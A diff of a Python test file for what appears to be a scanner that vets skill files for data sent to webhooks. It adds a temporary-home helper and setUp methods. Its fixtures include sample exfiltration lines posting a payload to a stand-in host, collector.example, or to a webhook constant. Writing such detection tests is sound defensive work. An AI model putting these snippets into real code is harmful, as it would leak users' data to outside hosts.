@@ -2,7 +2,7 @@
 
 Every test marked "replay" fails on 77dedd1 on its assertion (measured with 77dedd1's watchtower/, rules and routines and this
 file in place); "guard" ones keep what must not change. All secrets are fake, and no platform folder of this computer is opened."""
-import gzip, json, os, shutil, sys, unittest
+import gzip, json, os, shutil, sys, tempfile, unittest
 from unittest import mock
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from test_boxes import Box, ROOT
@@ -12,6 +12,13 @@ import test_batch5_codex_r2 as r2
 from test_batch5_codex_r2 import rules_of, fenced
 
 COLLECTOR = "config = {'hook': 'https://collector.example'}\n"
+
+
+def temp_home(test):
+    """A temp ISR_BOT_HOME for a Folder class (v0.8.0 unit f fix 1: vet's main() makes the home's state folder, and Folder sets
+    no home, so it was the default one)."""
+    d = tempfile.mkdtemp(); test.addCleanup(shutil.rmtree, d, True)
+    p = mock.patch.dict(os.environ, {"ISR_BOT_HOME": os.path.join(d, "isr_home")}); p.start(); test.addCleanup(p.stop)
 
 
 # ---------------------------------------------------------------- 1: a lookup or a collection doesn't establish the destination
@@ -30,6 +37,10 @@ class LookupsAndCollections(Folder):
                    "hooks = ['https://collector.example', '" + HOOK + "']\nrequests.post(hooks[0], json=payload)",
                    "hooks = ('" + HOOK + "', 'https://collector.example')\nrequests.post(hooks[1], json=payload)",
                    "config = {'discord': '" + HOOK + "'}\nrequests.post(config['api'], json=payload)\nAPI = 'https://collector.example'")
+
+    def setUp(self):
+        super().setUp()
+        temp_home(self)
 
     def test_the_codex_overridden_default_is_critical(self):   # replay (77dedd1: Install with changes, ISR-T018)
         code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX)))
@@ -65,6 +76,10 @@ class LookupsAndCollections(Folder):
 # ---------------------------------------------------------------- 5: an HTTP client's GET is a GET, whatever its other arguments
 class HttpGets(Folder):
     CODEX = (("python", "requests.get('" + HOOK + "', params)"), ("js", "https.get('" + HOOK + "', namedCallback)"))
+
+    def setUp(self):
+        super().setUp()
+        temp_home(self)
 
     def test_the_codex_gets_are_chat_webhooks(self):   # replay (77dedd1: Do not install, ISR-T005)
         lang, c = self.CODEX[0]
@@ -187,7 +202,7 @@ class RenamedInstall(Box):
 
     def test_a_folder_without_the_commit_record_is_still_a_checkout(self):   # guard
         self.install()
-        real = os.path.join(self.tmp, "src", "watchtower-copy")
+        real = os.path.join(self.tmp, "src", "isr-bot-copy")
         os.makedirs(os.path.dirname(real))
         os.rename(self.app, real)
         with mock.patch.object(isr, "SELF_ROOT", real):
